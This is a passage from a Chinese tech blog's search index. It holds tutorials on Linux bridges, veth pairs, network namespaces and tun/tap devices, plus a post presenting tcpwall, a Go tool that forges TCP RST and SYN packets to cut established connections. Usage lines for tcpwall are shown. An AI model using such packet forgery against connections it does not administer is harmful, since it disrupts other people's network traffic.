10.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 69ms rtt min/avg/max/mdev = 0.032/0.047/0.060/0.013 ms 使用ip netns exec ns2 ping 10.0.0.2在命名空间ns2中测试与ns1的10.0.0.2的网络连通性\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.030 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.055 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.044 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.042 ms ^C --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 114ms rtt min/avg/max/mdev = 0.030/0.042/0.055/0.011 ms 可以看到我们通过网桥的方式把三个隔离的netns连接在了一起，通过这种方式，我们还可以很方便的添加第四个netns，第五个netns\u0026hellip;在这里我们就不展开了，感兴趣的同学可以尝试一下。\n接下来我们来讲解一下docker的几种网络模式。\n","permalink":"https://typesafe.cn/posts/linux-bridge/","summary":"Linux Bridge 详解 Linux Bridge（网桥）是用纯软件实现的虚拟交换机，有着和物理交换机相同的功能，例如二层交换，MAC地址学习等。因此我们可以把tun/tap，veth pair等设备绑定到网桥上，就像是把设备连接到物理交换机上一样。此外它和veth pair、tun/tap一样，也是一种虚拟网络设备，具有虚拟设备的所有特性，例如配置IP，MAC地址等。\nLinux Bridge通常是搭配KVM、docker等虚拟化技术一起使用的，用于构建虚拟网络，因为此教程不涉及虚拟化技术，我们就使用前面学习过的netns来模拟虚拟设备。\n如何使用Linux Bridge？ 操作网桥有多种方式，在这里我们介绍一下通过bridge-utils来操作，由于它不是Linux系统自带的工具，因此需要我们手动来安装它。\n# centos yum install -y bridge-utils # ubuntu apt-get install -y bridge-utils 使用brctl help查看使用帮助\nnever heard of command [help] Usage: brctl [commands] commands: addbr \u0026lt;bridge\u0026gt;\tadd bridge delbr \u0026lt;bridge\u0026gt;\tdelete bridge addif \u0026lt;bridge\u0026gt; \u0026lt;device\u0026gt;\tadd interface to bridge delif \u0026lt;bridge\u0026gt; \u0026lt;device\u0026gt;\tdelete interface from bridge hairpin \u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; {on|off}\tturn hairpin on/off setageing \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset ageing time setbridgeprio\t\u0026lt;bridge\u0026gt; \u0026lt;prio\u0026gt;\tset bridge priority setfd \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset bridge forward delay sethello \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset hello time setmaxage \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset max message age setpathcost\t\u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u0026lt;cost\u0026gt;\tset path cost setportprio\t\u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u0026lt;prio\u0026gt;\tset port priority show [ \u0026lt;bridge\u0026gt; ]\tshow a list of bridges showmacs \u0026lt;bridge\u0026gt;\tshow a list of mac addrs showstp \u0026lt;bridge\u0026gt;\tshow bridge stp info stp \u0026lt;bridge\u0026gt; {on|off}\tturn stp on/off 常用命令如","title":"Linux Bridge 详解"},{"content":"Linux veth pair 详解 veth pair是成对出现的一种虚拟网络设备接口，一端连着网络协议栈，一端彼此相连。如下图所示：\n由于它的这个特性，常常被用于构建虚拟网络拓扑。例如连接两个不同的网络命名空间(netns)，连接docker容器，连接网桥(Bridge)等，其中一个很常见的案例就是OpenStack Neutron底层用它来构建非常复杂的网络拓扑。\n如何使用？ 创建一对veth\nip link add \u0026lt;veth name\u0026gt; type veth peer name \u0026lt;peer name\u0026gt; 实验 我们改造上一节完成的netns实验，使用veth pair将两个的隔离netns连接起来。如下图所示：\n我们首先创建一对veth设备，将veth设备分别移动到两个netns中并启动。\n# 创建一对veth ip link add veth0 type veth peer name veth1 # 将veth移动到netns中 ip link set veth0 netns ns0 ip link set veth1 netns ns1 # 启动 ip netns exec ns0 ip link set veth0 up ip netns exec ns1 ip link set veth1 up 接下来我们测试一下。\n使用ip netns exec ns0 ping 10.0.0.2在命名空间ns0中测试与tap1的网络连通性。\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. From 10.0.0.1 icmp_seq=1 Destination Host Unreachable From 10.0.0.1 icmp_seq=2 Destination Host Unreachable From 10.0.0.1 icmp_seq=3 Destination Host Unreachable ^C --- 10.0.0.2 ping statistics --- 5 packets transmitted, 0 received, +3 errors, 100% packet loss, time 77ms pipe 4 使用ip netns exec ns1 ping 10.0.0.1在命名空间ns1中测试与tap0的网络连通性。\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. From 10.0.0.2 icmp_seq=1 Destination Host Unreachable From 10.0.0.2 icmp_seq=2 Destination Host Unreachable From 10.0.0.2 icmp_seq=3 Destination Host Unreachable ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 0 received, +3 errors, 100% packet loss, time 108ms pipe 4 什么情况？为什么网络还是不通呢？答案就是路由配置有问题。\n使用ip netns exec ns0 route -n查看ns0的路由表。\nKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.0.0.0 0.0.0.0 255.255.255.0 U 0 0 0 tap0 使用ip netns exec ns1 route -n查看ns1的路由表。\nKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.0.0.0 0.0.0.0 255.255.255.0 U 0 0 0 tap1 原来访问10.0.0.0/24的流量都从tap设备发出去了，又因为tap设备没有和其他设备相连，发出去的数据报文不会被处理，因此还是访问不到目标IP，我们来修改一下路由，让访问10.0.0.0/24的流量从veth设备发出。\n#修改路由出口为veth ip netns exec ns0 ip route change 10.0.0.0/24 via 0.0.0.0 dev veth0 ip netns exec ns1 ip route change 10.0.0.0/24 via 0.0.0.0 dev veth1 我们再来看一下路由\n使用ip netns exec ns0 route -n查看ns0的路由表。\nKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.0.0.0 0.0.0.0 255.255.255.0 U 0 0 0 veth0 使用ip netns exec ns1 route -n查看ns1的路由表。\nKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.0.0.0 0.0.0.0 255.255.255.0 U 0 0 0 veth1 最后我们再来测试一下。\n使用ip netns exec ns0 ping 10.0.0.2在命名空间ns0中测试与tap1的网络连通性。\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.031 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.035 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.037 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.043 ms ^C --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 103ms rtt min/avg/max/mdev = 0.031/0.036/0.043/0.007 ms 使用ip netns exec ns1 ping 10.0.0.1在命名空间ns1中测试与tap0的网络连通性。\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms 64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.047 ms 64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.051 ms 64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.042 ms ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 66ms rtt min/avg/max/mdev = 0.027/0.041/0.051/0.012 ms 可以看到我们使用veth pair将两个隔离的netns成功的连接到了一起。\n但是这样的网络拓扑存在一个弊端，随着网络设备的增多，网络连线的复杂度将成倍增长。 如果连接三个netns时，网络连线就成了下图的样子\n而如果连接四个netns时，网络连线就成了下图的样子\n如果有五台设备。。。\n有没有什么技术可以解决这个问题呢？答案是有的，Linux Bridge（网桥）。下一节我们将使用网桥来将多个隔离的netns连接起来，这样网络连线就非常清爽了。\n","permalink":"https://typesafe.cn/posts/linux-veth-pair/","summary":"Linux veth pair 详解 veth pair是成对出现的一种虚拟网络设备接口，一端连着网络协议栈，一端彼此相连。如下图所示：\n由于它的这个特性，常常被用于构建虚拟网络拓扑。例如连接两个不同的网络命名空间(netns)，连接docker容器，连接网桥(Bridge)等，其中一个很常见的案例就是OpenStack Neutron底层用它来构建非常复杂的网络拓扑。\n如何使用？ 创建一对veth\nip link add \u0026lt;veth name\u0026gt; type veth peer name \u0026lt;peer name\u0026gt; 实验 我们改造上一节完成的netns实验，使用veth pair将两个的隔离netns连接起来。如下图所示：\n我们首先创建一对veth设备，将veth设备分别移动到两个netns中并启动。\n# 创建一对veth ip link add veth0 type veth peer name veth1 # 将veth移动到netns中 ip link set veth0 netns ns0 ip link set veth1 netns ns1 # 启动 ip netns exec ns0 ip link set veth0 up ip netns exec ns1 ip link set veth1 up 接下来我们测试一下。","title":"Linux veth pair 详解"},{"content":"Network Namespace （以下简称netns）是Linux内核提供的一项实现网络隔离的功能，它能隔离多个不同的网络空间，并且各自拥有独立的网络协议栈，这其中便包括了网络接口（网卡），路由表，iptables规则等。例如大名鼎鼎的docker便是基于netns实现的网络隔离，今天我们就来手动实验一下netns的隔离特性。\n使用方式 使用ip netns help查看使用帮助\nUsage: ip netns list ip netns add NAME ip netns set NAME NETNSID ip [-all] netns delete [NAME] ip netns identify [PID] ip netns pids NAME ip [-all] netns exec [NAME] cmd ... ip netns monitor ip netns list-id 开始实验 我们将要构建如下图的网络\n首先我们添加两个tap设备并配置上IP信息，然后添加两个netns，最后将tap设备移动到netns中\n# 添加并启动虚拟网卡tap设备 ip tuntap add dev tap0 mode tap ip tuntap add dev tap1 mode tap ip link set tap0 up ip link set tap1 up # 配置IP ip addr add 10.0.0.1/24 dev tap0 ip addr add 10.0.0.2/24 dev tap1 # 添加netns ip netns add ns0 ip netns add ns1 # 将虚拟网卡tap0，tap1分别移动到ns0和ns1中 ip link set tap0 netns ns0 ip link set tap1 netns ns1 在宿主机器上使用ping 10.0.0.1测试与tap0的网络连通性\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. ^C --- 10.0.0.1 ping statistics --- 2 packets transmitted, 0 received, 100% packet loss, time 58ms 在宿主机器上使用ping 10.0.0.2测试与tap1的网络连通性\nping 10.0.0.2 PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. ^C --- 10.0.0.2 ping statistics --- 2 packets transmitted, 0 received, 100% packet loss, time 36ms  由于长时间未收到ICMP的回复报文，我使用Ctrl+C退出了。\n 使用ip netns exec ns0 ping 10.0.0.2在命名空间ns0中测试与tap1的网络连通性\nconnect: 网络不可达 使用ip netns exec ns1 ping 10.0.0.1在命名空间ns1中测试与tap0的网络连通性\nconnect: 网络不可达  在netns中执行命令有两种方式，一种是先在宿主机器上执行ip netns exec \u0026lt;netns name\u0026gt; bash进入netns，然后就可以像是在本机一样执行命令了。另一种是每次在宿主机器上使用完整的命令，为了明显区分，我们这里都使用完整的命令，例如ip netns exec ns0 ping 10.0.0.2的含义为在命名空间ns0中执行ping 10.0.0.2命令\n 可以看到在宿主机器上访问netns是丢包，而在netns中互相访问是网络不可达了，这是为什么呢？让我们来检查一下netns吧。\n使用ip netns exec ns0 ip a在ns0中查看网卡\n1: lo: \u0026lt;LOOPBACK\u0026gt; mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 16: tap0: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 42:ad:98:a2:cc:81 brd ff:ff:ff:ff:ff:ff 使用ip netns exec ns1 ip a在ns1中查看网卡\n1: lo: \u0026lt;LOOPBACK\u0026gt; mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 17: tap1: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 12:06:1d:06:41:57 brd ff:ff:ff:ff:ff:ff 可以看到不仅本地环回lo和tap设备的状态都是DOWN，甚至就连tap设备的IP信息也没有了，这是因为在不同的网络命名空间中移动虚拟网络接口时会重置虚拟网络接口的状态。\n我们将ns0和ns1中的相关设备都重新启动并配置上IP\nip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set tap0 up ip netns exec ns0 ip addr add 10.0.0.1/24 dev tap0 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set tap1 up ip netns exec ns1 ip addr add 10.0.0.2/24 dev tap1 首先我们测试一下netns中本地网络是否正常\n使用ip netns exec ns0 ping 10.0.0.1在命名空间ns0中测试本地网卡是否启动\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.036 ms 64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.033 ms 64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.084 ms 64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.044 ms ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 65ms rtt min/avg/max/mdev = 0.033/0.049/0.084/0.021 ms 使用ip netns exec ns1 ping 10.0.0.2在命名空间ns1中测试本地网卡是否启动\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.033 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.034 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.065 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.035 ms ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 65ms rtt min/avg/max/mdev = 0.033/0.049/0.084/0.021 ms 可以看出本地网络没有问题，然后我们再来测试一下两个netns之间的网络连通性\n使用ip netns exec ns0 ping 10.0.0.2在命名空间ns0中测试与tap1的网络连通性\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. ^C --- 10.0.0.2 ping statistics --- 3 packets transmitted, 0 received, 100% packet loss, time 84ms 使用ip netns exec ns1 ping 10.0.0.1在命名空间ns1中测试与tap0的网络连通性\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. ^C --- 10.0.0.1 ping statistics --- 2 packets transmitted, 0 received, 100% packet loss, time 30ms 可以看出没有任何ICMP回复包，netns确实把在同一台主机上的两张虚拟网卡隔离起来了。在这里我们只是简单的使用ping命令来测试网络的连通性，实际上可以做到更多，例如修改某一个netns的路由表或者防火墙规则，完全不会影响到其他的netns，当然也不会影响到宿主机器，在这里由于篇幅原因就不再展开实验了，感兴趣的同学可以实验一下。下一节我们将学习另一个网络设备veth pair，使用它来把两个netns连接起来，让两个隔离的​netns之间可以互相通信。\n","permalink":"https://typesafe.cn/posts/linux-netns/","summary":"Network Namespace （以下简称netns）是Linux内核提供的一项实现网络隔离的功能，它能隔离多个不同的网络空间，并且各自拥有独立的网络协议栈，这其中便包括了网络接口（网卡），路由表，iptables规则等。例如大名鼎鼎的docker便是基于netns实现的网络隔离，今天我们就来手动实验一下netns的隔离特性。\n使用方式 使用ip netns help查看使用帮助\nUsage: ip netns list ip netns add NAME ip netns set NAME NETNSID ip [-all] netns delete [NAME] ip netns identify [PID] ip netns pids NAME ip [-all] netns exec [NAME] cmd ... ip netns monitor ip netns list-id 开始实验 我们将要构建如下图的网络\n首先我们添加两个tap设备并配置上IP信息，然后添加两个netns，最后将tap设备移动到netns中\n# 添加并启动虚拟网卡tap设备 ip tuntap add dev tap0 mode tap ip tuntap add dev tap1 mode tap ip link set tap0 up ip link set tap1 up # 配置IP ip addr add 10.","title":"Linux Network Namespace (netns) 详解"},{"content":" 在计算机网络中，tun与tap是操作系统内核中的虚拟网络设备。不同于普通靠硬件网络适配器实现的设备，这些虚拟的网络设备全部用软件实现，并向运行于操作系统上的软件提供与硬件的网络设备完全相同的功能。\n tun/tap是什么？ tun是网络层的虚拟网络设备，可以收发第三层数据报文包，如IP封包，因此常用于一些点对点IP隧道，例如OpenVPN，IPSec等。\ntap是链路层的虚拟网络设备，等同于一个以太网设备，它可以收发第二层数据报文包，如以太网数据帧。Tap最常见的用途就是做为虚拟机的网卡，因为它和普通的物理网卡更加相近，也经常用作普通机器的虚拟网卡。\n如何操作tun/tap？ Linux tun/tap可以通过网络接口和字符设备两种方式进行操作。\n当应用程序使用标准网络接口socket API操作tun/tap设备时，和操作一个真实网卡无异。\n当应用程序使用字符设备操作tun/tap设备时，字符设备即充当了用户空间和内核空间的桥梁直接读写二层或三层的数据报文。在 Linux 内核 2.6.x 之后的版本中，tun/tap 对应的字符设备文件分别为：\ntun：/dev/net/tun tap：/dev/tap0 当应用程序打开字符设备时，系统会自动创建对应的虚拟设备接口，一般以tunX和tapX方式命名，虚拟设备接口创建成功后，可以为其配置IP、MAC地址、路由等。当一切配置完毕，应用程序通过此字符文件设备写入IP封包或以太网数据帧，tun/tap的驱动程序会将数据报文直接发送到内核空间，内核空间收到数据后再交给系统的网络协议栈进行处理，最后网络协议栈选择合适的物理网卡将其发出，到此发送流程完成。而物理网卡收到数据报文时会交给网络协议栈进行处理，网络协议栈匹配判断之后通过tun/tap的驱动程序将数据报文原封不动的写入到字符设备上，应用程序从字符设备上读取到IP封包或以太网数据帧，最后进行相应的处理，收取流程完成。\n 注意：当应用程序关闭字符设备时，系统也会自动删除对应的虚拟设备接口，并且会删除掉创建的路由等信息。\n tun/tap的区别 tun/tap 虽然工作原理一致，但是工作的层次不一样。\ntun是三层网络设备，收发的是IP层数据包，无法处理以太网数据帧，例如OpenVPN的路由模式就是使用了tun网络设备，OpenVPN Server重新规划了一个网段，所有的客户端都会获取到该网段下的一个IP，并且会添加对应的路由规则，而客户端与目标机器产生的数据报文都要经过OpenVPN网关才能转发。\ntap是二层网络设备，收发以太网数据帧，拥有MAC层的功能，可以和物理网卡通过网桥相连，组成一个二层网络。例如OpenVPN的桥接模式可以从外部打一条隧道到本地网络。进来的机器就像本地的机器一样参与通讯，丝毫看不出这些机器是在远程。如果你有使用过虚拟机的经验，桥接模式也是一种十分常见的网络方案，虚拟机会分配到和宿主机器同网段的IP，其他同网段的机器也可以通过网络访问到这台虚拟机。\n使用方式 Linux 提供了一些命令行程序方便我们来创建持久化的tun/tap设备，但是如果没有应用程序打开对应的文件描述符，tun/tap的状态一直会是DOWN，还好的是这并不会影响我们把它当作普通网卡去使用。\n使用ip tuntap help查看使用帮助\nUsage: ip tuntap { add | del | show | list | lst | help } [ dev PHYS_DEV ] [ mode { tun | tap } ] [ user USER ] [ group GROUP ] [ one_queue ] [ pi ] [ vnet_hdr ] [ multi_queue ] [ name NAME ] Where:\tUSER := { STRING | NUMBER } GROUP := { STRING | NUMBER } 示例 # 创建 tap  ip tuntap add dev tap0 mode tap # 创建 tun ip tuntap add dev tun0 mode tun # 删除 tap ip tuntap del dev tap0 mode tap # 删除 tun ip tuntap del dev tun0 mode tun tun/tap 设备创建成功后可以当作普通的网卡一样使用，因此我们也可以通过ip link命令来操作它。\n# 例如使用ip link命令也可以删除tun/tap设备 ip link del tap0 ip link del tun0 ","permalink":"https://typesafe.cn/posts/linux-tun-tap/","summary":"在计算机网络中，tun与tap是操作系统内核中的虚拟网络设备。不同于普通靠硬件网络适配器实现的设备，这些虚拟的网络设备全部用软件实现，并向运行于操作系统上的软件提供与硬件的网络设备完全相同的功能。\n tun/tap是什么？ tun是网络层的虚拟网络设备，可以收发第三层数据报文包，如IP封包，因此常用于一些点对点IP隧道，例如OpenVPN，IPSec等。\ntap是链路层的虚拟网络设备，等同于一个以太网设备，它可以收发第二层数据报文包，如以太网数据帧。Tap最常见的用途就是做为虚拟机的网卡，因为它和普通的物理网卡更加相近，也经常用作普通机器的虚拟网卡。\n如何操作tun/tap？ Linux tun/tap可以通过网络接口和字符设备两种方式进行操作。\n当应用程序使用标准网络接口socket API操作tun/tap设备时，和操作一个真实网卡无异。\n当应用程序使用字符设备操作tun/tap设备时，字符设备即充当了用户空间和内核空间的桥梁直接读写二层或三层的数据报文。在 Linux 内核 2.6.x 之后的版本中，tun/tap 对应的字符设备文件分别为：\ntun：/dev/net/tun tap：/dev/tap0 当应用程序打开字符设备时，系统会自动创建对应的虚拟设备接口，一般以tunX和tapX方式命名，虚拟设备接口创建成功后，可以为其配置IP、MAC地址、路由等。当一切配置完毕，应用程序通过此字符文件设备写入IP封包或以太网数据帧，tun/tap的驱动程序会将数据报文直接发送到内核空间，内核空间收到数据后再交给系统的网络协议栈进行处理，最后网络协议栈选择合适的物理网卡将其发出，到此发送流程完成。而物理网卡收到数据报文时会交给网络协议栈进行处理，网络协议栈匹配判断之后通过tun/tap的驱动程序将数据报文原封不动的写入到字符设备上，应用程序从字符设备上读取到IP封包或以太网数据帧，最后进行相应的处理，收取流程完成。\n 注意：当应用程序关闭字符设备时，系统也会自动删除对应的虚拟设备接口，并且会删除掉创建的路由等信息。\n tun/tap的区别 tun/tap 虽然工作原理一致，但是工作的层次不一样。\ntun是三层网络设备，收发的是IP层数据包，无法处理以太网数据帧，例如OpenVPN的路由模式就是使用了tun网络设备，OpenVPN Server重新规划了一个网段，所有的客户端都会获取到该网段下的一个IP，并且会添加对应的路由规则，而客户端与目标机器产生的数据报文都要经过OpenVPN网关才能转发。\ntap是二层网络设备，收发以太网数据帧，拥有MAC层的功能，可以和物理网卡通过网桥相连，组成一个二层网络。例如OpenVPN的桥接模式可以从外部打一条隧道到本地网络。进来的机器就像本地的机器一样参与通讯，丝毫看不出这些机器是在远程。如果你有使用过虚拟机的经验，桥接模式也是一种十分常见的网络方案，虚拟机会分配到和宿主机器同网段的IP，其他同网段的机器也可以通过网络访问到这台虚拟机。\n使用方式 Linux 提供了一些命令行程序方便我们来创建持久化的tun/tap设备，但是如果没有应用程序打开对应的文件描述符，tun/tap的状态一直会是DOWN，还好的是这并不会影响我们把它当作普通网卡去使用。\n使用ip tuntap help查看使用帮助\nUsage: ip tuntap { add | del | show | list | lst | help } [ dev PHYS_DEV ] [ mode { tun | tap } ] [ user USER ] [ group GROUP ] [ one_queue ] [ pi ] [ vnet_hdr ] [ multi_queue ] [ name NAME ] Where:\tUSER := { STRING | NUMBER } GROUP := { STRING | NUMBER } 示例 # 创建 tap  ip tuntap add dev tap0 mode tap # 创建 tun ip tuntap add dev tun0 mode tun # 删除 tap ip tuntap del dev tap0 mode tap # 删除 tun ip tuntap del dev tun0 mode tun tun/tap 设备创建成功后可以当作普通的网卡一样使用，因此我们也可以通过ip link命令来操作它。","title":"Linux tun/tap 详解"},{"content":"tcpwall 当我们想要阻止某些TCP连接的建立，在Linux平台上有一个很好的解决方案iptables，但是对那些已经建立的tcp连接，iptables就不能做到随心所欲的阻断了。\n我在互联网上检索的时候发现了tcpkill这个工具，tcpkill是一个网络分析工具集dsniff中的一个小工具。在Linux上可以直接通过dsniff包安装，使用方式也非常简单。\n通过测试我发现tcpkill在执行命令之后并不会立刻阻断tcp连接，而是等待有数据传输时，才会阻断，因此在执行完命令之后程序并不会主动退出，而是需要通过Ctrl+C来退出，这对于某些想要通过程序来调用的脚本小子（例如我）来说简直是个灾难。\n如何阻断一个已经建立的tcp连接？ 阻断一个已经建立的tcp连接通常有这几种方案：\n 服务端主动断开 客户端主动断开 拔掉网线（时间要超过tcp超时时间） 伪造RST数据包发送给服务端和客户端让它们主动断开（tcpkill就是这么做的）  前三种局限性太大，只能用第4种了。\n如何实现伪造RST数据报文包？ GoPacket 是go基于libpcap构建的一个库，可以通过旁路的方式接收一份数据包的拷贝。因此我们可以很方便捕获到正在通信的tcp数据报文。通过数据报文，我们可以获取到通信双方的MAC地址，IP和端口号，以及ACK号等，这些都是伪造数据包必不可少的。\n在学习了tcpkill的源码之后，我使用go开发了一个增强版的tcpwall，tcpwall不仅可以实现和tcpkill同样的基于ip或端口监听到指定数据报文之后伪造RST数据报文来阻断tcp连接，也可以通过源ip源端口，目的ip目的端口来主动发送SYN数据报文包来诱导那些没有数据的tcp连接发送ACK数据报文包以获取源MAC、目的MAC和ACK号，并且可以通过指定参数让程序等待一段时间后主动退出。\n如何使用 阻断指定IP和端口的TCP连接（不关心是源或者目的）\ntcpwall -i {interface} -host {host} -port {port} 阻断指定源IP和源端口的TCP连接\ntcpwall -i {interface} -shost {src_host} -sport {src_port} 阻断指定目的IP和目的端口的TCP连接\ntcpwall -i {interface} -dhost {dst_host} -dport {dst_port} 阻断指定源IP、源端口、目的IP、目的端口的TCP连接（会主动向双方发送SYN数据报文包）\ntcpwall -i {interface} -shost {src_host} -sport {src_port} -dhost {dst_host} -dport {dst_port} 其他  -timeout 时间（秒）指定等待多久之后退出程序  项目地址 https://github.com/dushixiang/tcpwall\n","permalink":"https://typesafe.cn/posts/tcpwall/","summary":"tcpwall 当我们想要阻止某些TCP连接的建立，在Linux平台上有一个很好的解决方案iptables，但是对那些已经建立的tcp连接，iptables就不能做到随心所欲的阻断了。\n我在互联网上检索的时候发现了tcpkill这个工具，tcpkill是一个网络分析工具集dsniff中的一个小工具。在Linux上可以直接通过dsniff包安装，使用方式也非常简单。\n通过测试我发现tcpkill在执行命令之后并不会立刻阻断tcp连接，而是等待有数据传输时，才会阻断，因此在执行完命令之后程序并不会主动退出，而是需要通过Ctrl+C来退出，这对于某些想要通过程序来调用的脚本小子（例如我）来说简直是个灾难。\n如何阻断一个已经建立的tcp连接？ 阻断一个已经建立的tcp连接通常有这几种方案：\n 服务端主动断开 客户端主动断开 拔掉网线（时间要超过tcp超时时间） 伪造RST数据包发送给服务端和客户端让它们主动断开（tcpkill就是这么做的）  前三种局限性太大，只能用第4种了。\n如何实现伪造RST数据报文包？ GoPacket 是go基于libpcap构建的一个库，可以通过旁路的方式接收一份数据包的拷贝。因此我们可以很方便捕获到正在通信的tcp数据报文。通过数据报文，我们可以获取到通信双方的MAC地址，IP和端口号，以及ACK号等，这些都是伪造数据包必不可少的。\n在学习了tcpkill的源码之后，我使用go开发了一个增强版的tcpwall，tcpwall不仅可以实现和tcpkill同样的基于ip或端口监听到指定数据报文之后伪造RST数据报文来阻断tcp连接，也可以通过源ip源端口，目的ip目的端口来主动发送SYN数据报文包来诱导那些没有数据的tcp连接发送ACK数据报文包以获取源MAC、目的MAC和ACK号，并且可以通过指定参数让程序等待一段时间后主动退出。\n如何使用 阻断指定IP和端口的TCP连接（不关心是源或者目的）\ntcpwall -i {interface} -host {host} -port {port} 阻断指定源IP和源端口的TCP连接\ntcpwall -i {interface} -shost {src_host} -sport {src_port} 阻断指定目的IP和目的端口的TCP连接\ntcpwall -i {interface} -dhost {dst_host} -dport {dst_port} 阻断指定源IP、源端口、目的IP、目的端口的TCP连接（会主动向双方发送SYN数据报文包）\ntcpwall -i {interface} -shost {src_host} -sport {src_port} -dhost {dst_host} -dport {dst_port} 其他  -timeout 时间（秒）指定等待多久之后退出程序  项目地址 https://github.com/dushixiang/tcpwall","title":"tcpkill在go语言下的实现和增强"}]